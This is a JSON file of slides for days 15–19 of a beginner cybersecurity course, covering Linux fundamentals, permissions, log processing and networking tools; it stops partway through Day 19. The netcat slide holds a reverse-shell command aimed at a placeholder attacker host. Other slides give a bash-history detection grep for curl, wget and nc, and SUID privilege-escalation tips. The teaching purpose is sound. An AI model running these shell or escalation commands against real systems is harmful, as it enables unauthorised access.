@@ -1,0 +1,1781 @@
+[
+  {
+    "day": 15,
+    "cover": {
+      "title": "Linux Intro: Why Hackers __Love Linux__",
+      "hook": "Every hacker, every server, every SOC runs Linux. Week 3 starts now.",
+      "tags": ["#Linux", "#KaliLinux", "#Day15of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "What is Linux?",
+        "tag": "Foundation",
+        "method": "WHAT — What is Linux?",
+        "heading": "Linux: The __Operating System__ of Security",
+        "body": [
+          {"type": "para", "text": "**Linux** is an open-source, Unix-like operating system built on the Linux kernel combined with GNU tools. It powers 90%+ of internet servers, cloud infrastructure, supercomputers, and virtually all enterprise security tools."},
+          {"type": "para", "text": "Unlike Windows, Linux is **completely open source** — no hidden telemetry, full access to every system component, and the ability to modify and rebuild anything. Security professionals need this level of transparency and control."},
+          {"type": "para", "text": "**Every major attack tool and defence platform runs on Linux.** Kali, Metasploit, Nmap, Wireshark, Burp Suite, Splunk — all built for Linux first. Windows support is always secondary."}
+        ],
+        "pills": [
+          {"text": "Kali Linux", "t": "r"},
+          {"text": "Open Source", "t": "y"},
+          {"text": "CLI", "t": "o"}
+        ],
+        "time": "20 min · linuxjourney.com — Intro Lesson"
+      },
+      {
+        "type": "red",
+        "label": "Why Linux for Security?",
+        "tag": "Importance",
+        "method": "WHY — Why Every Security Pro Uses Linux",
+        "heading": "Why Linux is the __Security Standard__",
+        "body": [
+          {"type": "bullet", "text": "**Kali Linux** — the industry-standard penetration testing distribution. Ships with 600+ pre-installed security tools ready to use from first boot."},
+          {"type": "bullet", "text": "**Parrot OS** — lightweight alternative to Kali. Better for digital forensics and OSINT work. Popular in SOC analyst roles."},
+          {"type": "bullet", "text": "**Ubuntu Server** — the default OS for most SOC infrastructure, SIEM deployments, and cloud security workloads."},
+          {"type": "bullet", "text": "**96% of web servers run Linux.** To attack a target or defend it, you must understand its operating system from the inside out."},
+          {"type": "para", "text": "**Shell scripting** lets you automate entire attack workflows, reconnaissance pipelines, and incident response procedures — saving hours on every engagement."}
+        ],
+        "time": "20 min · kali.org/docs — Official Kali Documentation"
+      },
+      {
+        "type": "dark",
+        "label": "Linux Distributions",
+        "tag": "Distros",
+        "method": "WHAT — Choosing the Right Distribution",
+        "heading": "Linux __Distributions__: Which One?",
+        "body": [
+          {"type": "bullet", "text": "**Debian-based (Ubuntu, Kali, Parrot):** Uses apt package manager. Ubuntu = best for beginners. Kali = best for security and pentesting. Most common in security roles."},
+          {"type": "bullet", "text": "**Red Hat-based (RHEL, CentOS, Fedora):** Uses yum/dnf package manager. RHEL and CentOS dominate enterprise production environments. RHCSA certification targets these."},
+          {"type": "bullet", "text": "**Arch-based (Arch, Manjaro, BlackArch):** Bleeding-edge packages, maximum control. BlackArch has 2,800+ security tools. For advanced users only."},
+          {"type": "para", "text": "**Recommendation:** Start with Ubuntu for learning. Install Kali as your security lab VM. Know that enterprise work will likely involve RHEL/CentOS."}
+        ],
+        "time": "15 min · distrowatch.com — Compare all major distributions"
+      },
+      {
+        "type": "white",
+        "label": "Linux Filesystem",
+        "tag": "Structure",
+        "method": "WHAT — The Filesystem Hackers Target",
+        "heading": "Linux Filesystem __Structure__",
+        "body": [
+          {"type": "code", "text": "/          — Root of the entire filesystem"},
+          {"type": "code", "text": "/home      — User home directories (SSH keys, bash history)"},
+          {"type": "code", "text": "/etc       — Config files (/etc/passwd, /etc/shadow, /etc/ssh)"},
+          {"type": "code", "text": "/var/log   — System logs (auth.log, syslog, apache2/access.log)"},
+          {"type": "code", "text": "/tmp       — Temp files — world-writable — attackers stage here"},
+          {"type": "code", "text": "/bin /usr/bin — Executables and system binaries"},
+          {"type": "code", "text": "/root      — Root user's home — the ultimate pentest target"}
+        ],
+        "time": "20 min · TryHackMe 'Linux Fundamentals Part 1'"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 15 Learning Targets",
+        "heading": "Day 15 Checklist",
+        "steps": [
+          "Understand **why Linux dominates** security — server share, tool ecosystem, open-source control",
+          "Know the **3 main distro families** — Debian, Red Hat, Arch — and which to use when",
+          "Memorise the **7 critical Linux directories** — /etc, /home, /var/log, /tmp, /root, /bin, /proc",
+          "Set up **Linux access today** — VirtualBox + Ubuntu, WSL2, or TryHackMe AttackBox",
+          "Run `ls /` to explore the root filesystem — identify what lives in each directory"
+        ],
+        "time": "Total Day 15 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 15",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "📺 Interactive", "name": "LinuxJourney.com — Free Interactive Linux Course", "url": "linuxjourney.com"},
+          {"label": "🧪 Lab", "name": "TryHackMe — 'Linux Fundamentals Part 1' (free)", "url": "tryhackme.com/room/linuxfundamentalspart1"},
+          {"label": "📖 Course", "name": "Cisco NetAcad — Linux Unhatched (free)", "url": "netacad.com/courses/linux-unhatched"},
+          {"label": "🛠️ Download", "name": "Kali Linux — Official ISO Download", "url": "kali.org/get-kali"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 15",
+        "heading": "Your Hands-On __Task__ for Day 15",
+        "steps": [
+          "**Install** Ubuntu in VirtualBox OR enable WSL2 on Windows — do this today, not tomorrow",
+          "**Boot** Linux and run `ls /` — explore the root filesystem directory by directory",
+          "**Complete** linuxjourney.com Intro lesson — interactive, browser-based, no setup needed",
+          "**Take a screenshot** of your terminal showing `ls /` — you are now a Linux user"
+        ],
+        "time": "Hands-On Task: 60 – 90 minutes (including setup)"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 15",
+        "quote": "Use Linux daily — even just for file operations and browsing. Muscle memory with commands is built through daily repetition, not weekly reading.",
+        "sub": "The single biggest differentiator between junior and senior security professionals is Linux fluency. Not knowing — fluency. The commands should feel natural, not requiring thought. That only comes from daily use for months, starting today.",
+        "mistake": "Only using Linux inside guided tutorials. Tutorial Linux is not real Linux. Open a terminal and use it for your actual daily tasks — writing notes, managing files, browsing the web. Forced daily exposure builds the muscle memory that tutorials never can."
+      }
+    ]
+  },
+
+  {
+    "day": 16,
+    "cover": {
+      "title": "Essential Linux Commands: __Navigation__",
+      "hook": "Master these 15 commands and you can navigate any Linux system.",
+      "tags": ["#Linux", "#CLI", "#Day16of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "Navigation Core",
+        "tag": "Foundation",
+        "method": "WHAT — Core Navigation Commands",
+        "heading": "Navigation: __6 Commands__ to Master First",
+        "body": [
+          {"type": "code", "text": "pwd          # Print working directory — where am I?"},
+          {"type": "code", "text": "ls           # List files in current directory"},
+          {"type": "code", "text": "ls -la       # Detailed list — includes hidden files (dot files)"},
+          {"type": "code", "text": "cd /var/log  # Change to absolute path"},
+          {"type": "code", "text": "cd ..        # Go up one directory level"},
+          {"type": "code", "text": "cd ~         # Jump to your home directory instantly"}
+        ],
+        "note": "**Hidden files** start with a dot (`.bashrc`, `.ssh`). They are invisible with `ls` but visible with `ls -la`. Attackers and malware love hiding here.",
+        "time": "20 min · linuxjourney.com — Command Line Lesson"
+      },
+      {
+        "type": "red",
+        "label": "File Operations",
+        "tag": "Critical Commands",
+        "method": "WHAT — Creating, Copying, Moving, Deleting",
+        "heading": "File Operations: __Create, Move, Delete__",
+        "body": [
+          {"type": "code", "text": "touch file.txt        # Create empty file"},
+          {"type": "code", "text": "mkdir reports         # Create directory"},
+          {"type": "code", "text": "mkdir -p a/b/c        # Create nested directories"},
+          {"type": "code", "text": "cp source.txt dest/   # Copy file to directory"},
+          {"type": "code", "text": "mv file.txt newname   # Rename OR move file"},
+          {"type": "code", "text": "rm file.txt           # Delete file (permanent — no recycle bin)"},
+          {"type": "code", "text": "rm -rf directory/     # Force delete directory and ALL contents"}
+        ],
+        "time": "20 min · Practice in your terminal — create, move, delete files"
+      },
+      {
+        "type": "dark",
+        "label": "Viewing Files",
+        "tag": "File Reading",
+        "method": "WHAT — Reading File Contents",
+        "heading": "Viewing Files: __4 Essential Commands__",
+        "body": [
+          {"type": "code", "text": "cat /etc/passwd         # Print entire file to terminal"},
+          {"type": "code", "text": "less /var/log/syslog    # Paginate — q to quit, / to search"},
+          {"type": "code", "text": "head -n 10 file.txt     # Show first 10 lines only"},
+          {"type": "code", "text": "tail -n 20 file.txt     # Show last 20 lines only"},
+          {"type": "code", "text": "tail -f /var/log/syslog # Follow live — new lines appear in real-time"}
+        ],
+        "note": "**`tail -f`** is essential for SOC analysts — it streams live log output so you can watch events as they happen. Every analyst should know this command cold.",
+        "time": "20 min · Run each command against real system files"
+      },
+      {
+        "type": "white",
+        "label": "Finding Files",
+        "tag": "Search Commands",
+        "method": "WHAT — Searching the Filesystem",
+        "heading": "Finding Files: __Search the Entire System__",
+        "body": [
+          {"type": "code", "text": "find / -name '*.conf' 2>/dev/null    # Find all .conf files"},
+          {"type": "code", "text": "find /home -name '*.txt' -type f     # Files only, not dirs"},
+          {"type": "code", "text": "find / -user root -perm -4000        # SUID files owned by root"},
+          {"type": "code", "text": "locate passwd                        # Fast search using database"},
+          {"type": "code", "text": "which python3                        # Find executable location"},
+          {"type": "code", "text": "whereis nmap                         # Binary + manual page paths"}
+        ],
+        "time": "25 min · Run find commands against your system — explore results"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 16 Learning Targets",
+        "heading": "Day 16 Checklist",
+        "steps": [
+          "Navigate using only **pwd, ls -la, cd** — no mouse, no file manager, CLI only",
+          "Create a directory structure — **mkdir -p** nested folders — then delete it with **rm -rf**",
+          "View file contents with **cat, less, head, tail** — use each one on a real system file",
+          "Use **tail -f /var/log/syslog** — watch live system events for 2 minutes",
+          "Find all hidden files in your home directory with **ls -la ~** — document what you find"
+        ],
+        "time": "Total Day 16 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 16",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "📺 Interactive", "name": "LinuxJourney.com — Command Line Section", "url": "linuxjourney.com"},
+          {"label": "🎮 Wargame", "name": "OverTheWire Bandit — Linux CLI Wargame (free)", "url": "overthewire.org/wargames/bandit"},
+          {"label": "🧪 Lab", "name": "LabEx — Free Browser-Based Linux Labs", "url": "labex.io/free-labs/linux"},
+          {"label": "🧪 Lab", "name": "TryHackMe — 'Linux Fundamentals Part 1' (free)", "url": "tryhackme.com/room/linuxfundamentalspart1"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 16",
+        "heading": "Your Hands-On __Task__ for Day 16",
+        "steps": [
+          "**Navigate** to /var/log — run `ls -la` — view the last 20 lines of syslog with `tail -n 20 syslog`",
+          "**Create** a directory structure: mkdir -p ~/practice/security/logs — then navigate through it",
+          "**Find** all .conf files on your system: `find /etc -name '*.conf' 2>/dev/null | head -20`",
+          "**Write** a cheat sheet of today's 15 commands — what each does, one real example per command"
+        ],
+        "time": "Hands-On Task: 45 – 60 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 16",
+        "quote": "`rm -rf` is one of the most dangerous commands in Linux. Never run it as root without being absolutely certain of the exact path. There is no undo.",
+        "sub": "Before any `rm -rf` command, use `ls` or `echo` to verify the path first. The command `echo rm -rf /path/` will print what would be deleted without actually deleting it — use this safety check every single time.",
+        "mistake": "Running all commands as root for convenience. Root access means any mistake, any typo, any malicious command has system-wide impact. Always work as a regular user. Only use sudo when explicitly required. This is professional discipline."
+      }
+    ]
+  },
+
+  {
+    "day": 17,
+    "cover": {
+      "title": "File Permissions & __User Management__",
+      "hook": "Linux permissions protect every file. Know them or get exploited.",
+      "tags": ["#Linux", "#Permissions", "#Day17of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "Permission Structure",
+        "tag": "Foundation",
+        "method": "WHAT — Reading Linux Permissions",
+        "heading": "Permission Structure: __rwx Explained__",
+        "body": [
+          {"type": "para", "text": "Every Linux file has a 10-character permission string. Example: `-rwxr-xr--` breaks down as: file type (1) + owner permissions (3) + group permissions (3) + others permissions (3)."},
+          {"type": "code", "text": "-rwxr-xr--\n│├──┤├──┤├──┤\n│owner group others"},
+          {"type": "bullet", "text": "**r (read=4)** — view file contents or list directory"},
+          {"type": "bullet", "text": "**w (write=2)** — modify file contents or add/delete in directory"},
+          {"type": "bullet", "text": "**x (execute=1)** — run file as program or enter directory"},
+          {"type": "para", "text": "**Octal notation:** Add values together. 7=rwx, 6=rw-, 5=r-x, 4=r--. chmod 755 = rwxr-xr-x. chmod 644 = rw-r--r--."}
+        ],
+        "pills": [
+          {"text": "chmod", "t": "r"},
+          {"text": "SUID", "t": "y"},
+          {"text": "sudo", "t": "o"}
+        ],
+        "time": "25 min · linuxjourney.com — Permissions Lesson"
+      },
+      {
+        "type": "red",
+        "label": "Special Permissions",
+        "tag": "Critical Concept",
+        "method": "WHAT — SUID, SGID, Sticky Bit",
+        "heading": "SUID & Special Permissions: __PrivEsc Path__",
+        "body": [
+          {"type": "bullet", "text": "**SUID (Set User ID):** File runs with the permissions of its OWNER rather than the user executing it. SUID bit on a root-owned binary = that binary runs as root for anyone who executes it."},
+          {"type": "bullet", "text": "**SGID (Set Group ID):** Similar to SUID but applies group ownership. Files created inside a SGID directory inherit the directory's group — used for collaborative directories."},
+          {"type": "bullet", "text": "**Sticky Bit:** On directories — only the file owner can delete their own files, even if others have write access. Used on /tmp to prevent users deleting each other's temp files."},
+          {"type": "para", "text": "**Pentest use:** SUID binaries on root-owned files are a classic privilege escalation vector. Finding a SUID bash binary or a custom SUID program = potential instant root access."}
+        ],
+        "time": "25 min · GTFOBins — SUID binary exploitation reference"
+      },
+      {
+        "type": "dark",
+        "label": "chmod & chown",
+        "tag": "Commands",
+        "method": "HOW — Changing Permissions and Ownership",
+        "heading": "chmod & chown: __Change Permissions__",
+        "body": [
+          {"type": "code", "text": "chmod 644 file.txt        # rw-r--r-- (standard file)"},
+          {"type": "code", "text": "chmod 755 script.sh       # rwxr-xr-x (executable script)"},
+          {"type": "code", "text": "chmod +x script.sh        # Add execute for all (symbolic)"},
+          {"type": "code", "text": "chmod o-w file.txt        # Remove write from others"},
+          {"type": "code", "text": "chown alice:developers f  # Change owner and group"},
+          {"type": "code", "text": "chown -R www-data /var/www # Recursive ownership change"}
+        ],
+        "time": "20 min · Practice chmod/chown on test files in your lab"
+      },
+      {
+        "type": "white",
+        "label": "User Management",
+        "tag": "Users & Groups",
+        "method": "WHAT — Managing Linux Users",
+        "heading": "User Management: __Add, Modify, Delete__",
+        "body": [
+          {"type": "code", "text": "useradd -m alice          # Create user with home directory"},
+          {"type": "code", "text": "passwd alice              # Set password for user"},
+          {"type": "code", "text": "usermod -aG sudo alice    # Add alice to sudo group"},
+          {"type": "code", "text": "userdel -r alice          # Delete user + home directory"},
+          {"type": "code", "text": "id alice                  # Show UID, GID, and groups"},
+          {"type": "code", "text": "whoami                    # Current user name"},
+          {"type": "code", "text": "sudo -l                   # List your sudo permissions"}
+        ],
+        "time": "20 min · TryHackMe 'Linux Fundamentals Part 2'"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 17 Learning Targets",
+        "heading": "Day 17 Checklist",
+        "steps": [
+          "Read **rwx permission strings** instantly — convert `-rwxr-xr--` to octal (754) without hesitation",
+          "Use **chmod** to set 755, 644, and 600 on test files — verify with `ls -la`",
+          "Find all **SUID binaries** on your system: `find / -perm -4000 2>/dev/null`",
+          "Create a **new user**, set a password, add to sudo group, then delete the user",
+          "Understand why **chmod 777** is dangerous — explain it to someone (or write it down)"
+        ],
+        "time": "Total Day 17 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 17",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "📺 Interactive", "name": "LinuxJourney.com — Permissions Section", "url": "linuxjourney.com"},
+          {"label": "🧪 Lab", "name": "TryHackMe — 'Linux Fundamentals Part 2' (free)", "url": "tryhackme.com/room/linuxfundamentalspart2"},
+          {"label": "🔧 Reference", "name": "GTFOBins — SUID Binary Exploitation Guide", "url": "gtfobins.github.io"},
+          {"label": "🧪 Module", "name": "TryHackMe — Linux Fundamentals Full Module", "url": "tryhackme.com/module/linux-fundamentals"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 17",
+        "heading": "Your Hands-On __Task__ for Day 17",
+        "steps": [
+          "**Find** all SUID binaries on your system: `find / -perm -4000 2>/dev/null` — count them",
+          "**Research** what each SUID binary does — look up any unfamiliar ones on GTFOBins",
+          "**Practice** chmod: create 3 files, set 600, 644, and 755 — verify with `ls -la` each time",
+          "**Create** a new user account, set password, add to sudo, verify with `id username`, then delete it"
+        ],
+        "time": "Hands-On Task: 60 – 75 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 17",
+        "quote": "SUID misconfigurations appear in 70% of CTF privilege escalation challenges. Know `find / -perm -4000 2>/dev/null` by heart — it is the first command you run after landing on a target.",
+        "sub": "After finding SUID binaries, cross-reference every result against GTFOBins.github.io — a database of known privilege escalation paths for common Linux binaries. If bash, vim, find, or python have SUID set on a target, you have root in seconds.",
+        "mistake": "Setting chmod 777 on files to 'fix permissions issues.' World-writable files mean any user — including attackers — can modify them. Finding chmod 777 files on a production server is a critical security finding. Always use the minimum permissions necessary."
+      }
+    ]
+  },
+
+  {
+    "day": 18,
+    "cover": {
+      "title": "Text Processing: __grep, awk, sed__",
+      "hook": "SOC analysts live in logs. These 3 commands are their superpower.",
+      "tags": ["#Linux", "#grep", "#Day18of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "grep Deep Dive",
+        "tag": "Foundation",
+        "method": "WHAT — grep for Security Analysis",
+        "heading": "grep: __Search Everything__ Instantly",
+        "body": [
+          {"type": "code", "text": "grep 'error' /var/log/syslog          # Basic search"},
+          {"type": "code", "text": "grep -i 'failed' /var/log/auth.log     # Case insensitive"},
+          {"type": "code", "text": "grep -r 'password' /etc/               # Recursive through dirs"},
+          {"type": "code", "text": "grep -v 'INFO' app.log                 # Exclude lines with INFO"},
+          {"type": "code", "text": "grep -n 'error' file.log               # Show line numbers"},
+          {"type": "code", "text": "grep -c 'Failed' /var/log/auth.log     # Count matching lines"},
+          {"type": "code", "text": "grep -E 'curl|wget|nc' /var/log/bash_history  # Regex — OR"}
+        ],
+        "pills": [
+          {"text": "grep", "t": "r"},
+          {"text": "awk", "t": "y"},
+          {"text": "sed", "t": "o"}
+        ],
+        "time": "25 min · linuxjourney.com · LabEx Linux Labs"
+      },
+      {
+        "type": "red",
+        "label": "Pipes & Redirection",
+        "tag": "Power Feature",
+        "method": "WHAT — Building Command Chains",
+        "heading": "Pipes & Redirection: __Chain Commands__",
+        "body": [
+          {"type": "code", "text": "command1 | command2     # Pipe output of 1 into input of 2"},
+          {"type": "code", "text": "command > file.txt      # Redirect output to file (overwrite)"},
+          {"type": "code", "text": "command >> file.txt     # Append output to file"},
+          {"type": "code", "text": "command 2>/dev/null     # Suppress error messages"},
+          {"type": "code", "text": "command 2>&1            # Redirect errors to stdout"},
+          {"type": "para", "text": "**Power combo example:**"},
+          {"type": "code", "text": "cat auth.log | grep 'FAIL' | wc -l\n# Count total failed login attempts"}
+        ],
+        "time": "20 min · Practice building 3-command chains in your terminal"
+      },
+      {
+        "type": "dark",
+        "label": "awk for Log Parsing",
+        "tag": "Field Extraction",
+        "method": "HOW — Using awk for Log Analysis",
+        "heading": "awk: __Extract Fields__ from Any Log",
+        "body": [
+          {"type": "code", "text": "awk '{print $1}' file.txt         # Print first field"},
+          {"type": "code", "text": "awk '{print $1, $3}' file.txt     # Print fields 1 and 3"},
+          {"type": "code", "text": "awk -F: '{print $1}' /etc/passwd  # Use : as delimiter"},
+          {"type": "code", "text": "awk '/error/ {print}' file.log    # Print lines matching pattern"},
+          {"type": "code", "text": "awk '{sum += $5} END {print sum}' # Sum a column of numbers"}
+        ],
+        "note": "**`awk -F: '{print $1}' /etc/passwd`** — prints every username on the system. This is one of the first enumeration commands a hacker runs after accessing a Linux box.",
+        "time": "25 min · Practice awk against /etc/passwd and auth.log"
+      },
+      {
+        "type": "white",
+        "label": "SOC One-Liner",
+        "tag": "Real SOC Use Case",
+        "method": "HOW — The Analyst's Brute-Force Detector",
+        "heading": "Real SOC __One-Liner__: Brute Force Detection",
+        "body": [
+          {"type": "code", "text": "cat /var/log/auth.log \\\n  | grep 'Failed password' \\\n  | awk '{print $11}' \\\n  | sort \\\n  | uniq -c \\\n  | sort -rn \\\n  | head -20"},
+          {"type": "para", "text": "**What this does:** Reads auth log → filters failed logins → extracts attacker IP address → sorts → counts unique occurrences → sorts by frequency (highest first) → shows top 20."},
+          {"type": "para", "text": "**Result:** A ranked list of the IP addresses most aggressively brute-forcing your SSH service right now. This is real SOC analyst work — not a tutorial exercise."}
+        ],
+        "time": "30 min · Run this command on your Linux system and analyse results"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 18 Learning Targets",
+        "heading": "Day 18 Checklist",
+        "steps": [
+          "Use **grep -i, -r, -v, -n, -c, -E** — practice each flag with a real log file",
+          "Build **3-command pipe chains** — combine cat, grep, sort, uniq, wc in sequence",
+          "Use **awk** to extract the first field from /etc/passwd — list all usernames on your system",
+          "Use **sed** to replace text in a file: `sed 's/old/new/g' file` — verify the change",
+          "Run the **SOC brute-force detection one-liner** — document how many failed logins you find"
+        ],
+        "time": "Total Day 18 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 18",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "📺 Interactive", "name": "LinuxJourney.com — Text Processing Section", "url": "linuxjourney.com"},
+          {"label": "🧪 Lab", "name": "LabEx — Free Browser-Based Linux Labs", "url": "labex.io/free-labs/linux"},
+          {"label": "📖 Practice", "name": "RegexOne.com — Free Regular Expressions Course", "url": "regexone.com"},
+          {"label": "🎮 Wargame", "name": "OverTheWire Bandit — Text Processing Challenges", "url": "overthewire.org/wargames/bandit"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 18",
+        "heading": "Your Hands-On __Task__ for Day 18",
+        "steps": [
+          "**Run** the SOC one-liner against your /var/log/auth.log — count failed SSH attempts",
+          "**Extract** all usernames from /etc/passwd using `awk -F: '{print $1}' /etc/passwd`",
+          "**Count** all error lines in /var/log/syslog: `grep -c 'error' /var/log/syslog`",
+          "**Use sed** to replace 'root' with 'ADMIN' in a copy of /etc/passwd — verify with cat"
+        ],
+        "time": "Hands-On Task: 60 – 75 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 18",
+        "quote": "One-liner command chains with pipes are daily SOC analyst work. Build the habit of chaining: cat → grep → awk → sort → uniq. Each command does one thing perfectly.",
+        "sub": "Learn basic regex alongside grep — it multiplies grep's power by 10x. `grep -E '(Failed|Invalid|error)'` matches multiple patterns simultaneously. `grep -E '[0-9]{1,3}\\.[0-9]{1,3}'` matches IP addresses. Regex is the skill that separates average analysts from elite ones.",
+        "mistake": "Skipping regex because it looks intimidating. Grep without regex is like a calculator that only adds. Spend 30 minutes on regexone.com — the payoff across your entire career is enormous. Every SOC tool, every SIEM query, every script uses regex patterns daily."
+      }
+    ]
+  },
+
+  {
+    "day": 19,
+    "cover": {
+      "title": "Networking in Linux: __netstat, ss, nmap__",
+      "hook": "See every connection on your Linux box. Network recon starts here.",
+      "tags": ["#Linux", "#Networking", "#Day19of90"]
+    },
+    "slides": [
+      {
+        "type": "dark",
+        "label": "ss Command",
+        "tag": "Foundation",
+        "method": "WHAT — The Modern Network Socket Tool",
+        "heading": "ss: The Modern __Network Scanner__",
+        "body": [
+          {"type": "code", "text": "ss -tulnp    # TCP+UDP, Listening, Numeric, Process names"},
+          {"type": "code", "text": "ss -t        # TCP connections only"},
+          {"type": "code", "text": "ss -u        # UDP connections only"},
+          {"type": "code", "text": "ss -s        # Summary statistics"},
+          {"type": "code", "text": "ss -anp      # All connections with process info (needs root)"},
+          {"type": "para", "text": "**`ss -tulnp`** is the single most important network command for security assessment. It shows every listening port, what service is bound to it, and which process opened it. **Run this first on any Linux box you access.**"}
+        ],
+        "pills": [
+          {"text": "ss", "t": "r"},
+          {"text": "ip", "t": "y"},
+          {"text": "netcat", "t": "o"}
+        ],
+        "time": "20 min · linuxjourney.com — Networking Section"
+      },
+      {
+        "type": "red",
+        "label": "ip Command",
+        "tag": "Network Config",
+        "method": "WHAT — Network Interface Management",
+        "heading": "ip Command: __Replace ifconfig__",
+        "body": [
+          {"type": "code", "text": "ip a                  # Show all interfaces and IP addresses"},
+          {"type": "code", "text": "ip r                  # Show routing table"},
+          {"type": "code", "text": "ip link               # Show interface link state"},
+          {"type": "code", "text": "ip addr add 10.0.0.1/24 dev eth0  # Add IP to interface"},
+          {"type": "code", "text": "ip link set eth0 up   # Bring interface up"},
+          {"type": "code", "text": "ip link set eth0 down # Take interface down"}
+        ],
+        "note": "**`ifconfig` is deprecated** on modern Linux. Always use `ip a` instead. Many job interview labs use modern systems where ifconfig is not installed — knowing `ip a` is mandatory.",
+        "time": "20 min · Practice ip commands on your Linux system"
+      },
+      {
+        "type": "dark",
+        "label": "ping, traceroute, curl",
+        "tag": "Connectivity Tools",
+        "method": "WHAT — Testing Network Connectivity",
+        "heading": "ping, traceroute & __curl__: Connectivity Tools",
+        "body": [
+          {"type": "code", "text": "ping -c 4 8.8.8.8         # Test connectivity (4 packets)"},
+          {"type": "code", "text": "traceroute google.com      # Trace packet path — each hop"},
+          {"type": "code", "text": "mtr google.com             # Live traceroute with statistics"},
+          {"type": "code", "text": "curl -I https://site.com   # HTTP headers only"},
+          {"type": "code", "text": "curl -s https://api.site   # Silent output — great for scripts"},
+          {"type": "code", "text": "wget https://site/file.zip # Download file from URL"}
+        ],
+        "time": "20 min · Test each command against real targets (your own systems)"
+      },
+      {
+        "type": "white",
+        "label": "netcat — The Swiss Army Knife",
+        "tag": "Power Tool",
+        "method": "WHAT — netcat for Security Testing",
+        "heading": "netcat: The __Hacker's Swiss Army Knife__",
+        "body": [
+          {"type": "code", "text": "nc -lvnp 4444             # Listen on port 4444"},
+          {"type": "code", "text": "nc target.com 80          # Connect to port 80"},
+          {"type": "code", "text": "nc -z target.com 20-100   # Port scan range 20–100"},
+          {"type": "code", "text": "# Reverse shell (attack lab only):\nnc -e /bin/bash attacker_ip 4444"},
+          {"type": "code", "text": "# File transfer:\nnc -lvnp 4444 > received.txt  # Receiver\nnc target 4444 < file.txt     # Sender"}
+        ],
+        "note": "**netcat** is used in both offensive security (reverse shells) and defensive security (port testing, file transfer). Understanding it is mandatory for both roles.",
+        "time": "25 min · Practice nc between two VMs in your lab"
+      },
+      {
+        "type": "yellow",
+        "label": "What to Learn Today",
+        "tag": "What to Learn",
+        "method": "WHAT — Day 19 Learning Targets",
+        "heading": "Day 19 Checklist",
+        "steps": [
+          "Run **`ss -tulnp`** — list every listening port and identify what service each one belongs to",
+          "Use **`ip a`** to show your network interfaces — identify your main IP and any secondary interfaces",
+          "Trace a packet route with **traceroute** or **mtr** — count how many hops to reach google.com",
+          "Use **curl -I** to fetch HTTP headers from a website — identify the web server and version",
+          "Set up a **netcat listener** on one terminal and connect to it from another — transfer text"
+        ],
+        "time": "Total Day 19 Study Time: 90 – 120 minutes"
+      },
+      {
+        "type": "resources_white",
+        "label": "Where to Learn",
+        "tag": "Free Resources",
+        "method": "WHERE — Best Resources for Day 19",
+        "heading": "Free Resources for __Today__",
+        "resources": [
+          {"label": "🧪 Lab", "name": "LabEx — Linux Networking Labs (free browser-based)", "url": "labex.io/free-labs/linux"},
+          {"label": "🧪 Lab", "name": "TryHackMe — 'Pre-Security' Networking Path (free)", "url": "tryhackme.com/path/outline/presecurity"},
+          {"label": "📺 Interactive", "name": "LinuxJourney.com — Networking Section", "url": "linuxjourney.com"},
+          {"label": "📖 Reference", "name": "ss Man Page — Complete Flag Reference", "url": "man7.org/linux/man-pages/man8/ss.8.html"}
+        ]
+      },
+      {
+        "type": "white",
+        "label": "Action Plan",
+        "tag": "How to Learn",
+        "method": "HOW — Step-by-Step for Day 19",
+        "heading": "Your Hands-On __Task__ for Day 19",
+        "steps": [
+          "**Run** `ss -tulnp` — document every listening port and research what each service is",
+          "**Identify** any unexpected open ports — any service you cannot explain is a security finding",
+          "**Use** curl -I on 3 different websites — note the Server header — what web server are they running?",
+          "**Practice** netcat: open a listener in one terminal with `nc -lvnp 9999` — connect from another with `nc localhost 9999` — type messages between them"
+        ],
+        "time": "Hands-On Task: 60 – 75 minutes"
+      },
+      {
+        "type": "quote",
+        "label": "Pro Tip",
+        "tag": "Pro Tip · Day 19",
+        "quote": "`ss -tulnp` should be in your muscle memory before any Linux security assessment. Open ports equal attack surface. Every unexpected open port is a finding worth investigating.",
